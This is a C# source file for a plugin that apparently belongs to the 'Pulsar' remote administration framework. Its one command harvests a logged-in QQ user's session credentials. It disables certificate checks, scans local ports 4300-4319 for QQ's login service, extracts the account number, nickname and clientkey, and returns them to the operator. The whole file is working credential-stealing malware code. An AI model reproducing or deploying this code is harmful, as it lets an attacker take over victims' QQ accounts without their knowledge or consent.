using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Pulsar.Common.Plugins;

namespace Pulsar.Client.Plugins.QQKey.Client
{
    public sealed class QQKeyClientPlugin : IUniversalPlugin
    {
        public string PluginId => "QQKey.Client";
        public string Version => "1.0.0";
        public string[] SupportedCommands => new[] { "GetQQKey" };

        private bool _isComplete;
        public bool IsComplete => _isComplete;

        private const string XLOGIN_URL = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone";
        private const string GET_UINS_PATH = "/pt_get_uins";
        private const string GET_ST_PATH = "/pt_get_st";

        public void Initialize(object initData)
        {
            _isComplete = false;
        }

        public PluginResult ExecuteCommand(string command, object parameters)
        {
            try
            {
                if (command == "GetQQKey")
                    return GetQQKey();
                return Fail("Unknown command: " + command);
            }
            catch (Exception ex)
            {
                return Fail("Error: " + ex.Message);
            }
        }

        private PluginResult GetQQKey()
        {
            // Accept all SSL certificates for localhost
            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;

            try
            {
                // Step 1: Get pt_local_token from xlogin
                var cookieContainer = new CookieContainer();
                var handler = new HttpClientHandler
                {
                    CookieContainer = cookieContainer,
                    AllowAutoRedirect = true,
                    UseCookies = true
                };

                string ptLocalToken = null;
                string ptLoginSig = null;

                using (var client = new System.Net.Http.HttpClient(handler))
                {
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36");

                    var loginResponse = client.GetAsync(XLOGIN_URL).Result;
                    loginResponse.EnsureSuccessStatusCode();

                    var uri = new Uri(XLOGIN_URL);
                    var cookies = cookieContainer.GetCookies(uri);
                    ptLocalToken = cookies["pt_local_token"]?.Value;
                    ptLoginSig = cookies["pt_login_sig"]?.Value;
                }

                if (string.IsNullOrEmpty(ptLocalToken))
                {
                    return Fail("Failed to get pt_local_token");
                }

                // Step 2: Scan ports 4300-4319 to find QQ local server
                string uin = null;
                string nickname = null;
                string clientKey = null;
                int foundPort = 0;

                for (int port = 4300; port <= 4319; port++)
                {
                    try
                    {
                        var result = TryGetQQInfo(port, ptLocalToken, ptLoginSig);
                        if (result != null)
                        {
                            uin = result.Uin;
                            nickname = result.Nickname;
                            clientKey = result.ClientKey;
                            foundPort = port;
                            break;
                        }
                    }
                    catch
                    {
                        // Port not available, continue scanning
                    }
                }

                if (string.IsNullOrEmpty(uin) || string.IsNullOrEmpty(clientKey))
                {
                    return Fail("No logged-in QQ found on this machine");
                }

                // Construct face URL
                var faceUrl = $"https://q1.qlogo.cn/g?b=qq&nk={uin}&s=100";

                // Return: uin|clientkey|nickname|faceurl
                var resultData = $"{uin}|{clientKey}|{nickname ?? ""}|{faceUrl}";
                return Ok(resultData, "GetQQKey");
            }
            catch (Exception ex)
            {
                return Fail("GetQQKey failed: " + ex.Message);
            }
        }

        private QQInfoResult TryGetQQInfo(int port, string ptLocalToken, string ptLoginSig)
        {
            var cookieContainer = new CookieContainer();
            var handler = new HttpClientHandler
            {
                CookieContainer = cookieContainer,
                AllowAutoRedirect = true,
                UseCookies = true
            };

            using (var client = new System.Net.Http.HttpClient(handler))
            {
                client.Timeout = TimeSpan.FromSeconds(3);
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Referer", "https://xui.ptlogin2.qq.com/");
                client.DefaultRequestHeaders.Add("Host", $"localhost.ptlogin2.qq.com:{port}");

                // Add required cookies
                cookieContainer.Add(new Uri($"https://localhost.ptlogin2.qq.com:{port}"), new Cookie("pt_local_token", ptLocalToken));
                if (!string.IsNullOrEmpty(ptLoginSig))
                    cookieContainer.Add(new Uri($"https://localhost.ptlogin2.qq.com:{port}"), new Cookie("pt_login_sig", ptLoginSig));

                // Get uins
                var random = new Random();
                var uinsUrl = $"https://localhost.ptlogin2.qq.com:{port}/pt_get_uins?callback=ptui_getuins_CB&r=0.{random.NextDouble()}&pt_local_tk={ptLocalToken}";
                var uinsResponse = client.GetAsync(uinsUrl).Result;
                var uinsText = uinsResponse.Content.ReadAsStringAsync().Result;

                // Parse uin and nickname from response like: ptui_getuins_CB([{"uin":123456789,"nickname":"Test","face":"..."}])
                var uinMatch = Regex.Match(uinsText, "\"uin\":(\\d+)");
                var nickMatch = Regex.Match(uinsText, "\"nickname\":\"([^\"]*)\"");

                if (!uinMatch.Success)
                    return null;

                var uin = uinMatch.Groups[1].Value;
                var nickname = nickMatch.Success ? nickMatch.Groups[1].Value : "";

                // Get clientkey
                var stUrl = $"https://localhost.ptlogin2.qq.com:{port}/pt_get_st?clientuin={uin}&r=0.{random.NextDouble()}&pt_local_tk={ptLocalToken}&callback=__jp0";
                var stResponse = client.GetAsync(stUrl).Result;

                // clientkey is in response cookies
                var stCookies = cookieContainer.GetCookies(new Uri($"https://localhost.ptlogin2.qq.com:{port}"));
                var clientKey = stCookies["clientkey"]?.Value;

                if (string.IsNullOrEmpty(clientKey))
                    return null;

                return new QQInfoResult
                {
                    Uin = uin,
                    Nickname = nickname,
                    ClientKey = clientKey
                };
            }
        }

        private class QQInfoResult
        {
            public string Uin { get; set; }
            public string Nickname { get; set; }
            public string ClientKey { get; set; }
        }

        private PluginResult Ok(string message, string command)
        {
            return new PluginResult
            {
                Success = true,
                Message = message,
                NextCommand = command,
                Data = null,
                ShouldUnload = false
            };
        }

        private PluginResult Fail(string message)
        {
            return new PluginResult
            {
                Success = false,
                Message = message,
                Data = null,
                ShouldUnload = false
            };
        }

        public void Cleanup()
        {
            _isComplete = true;
        }
    }
}
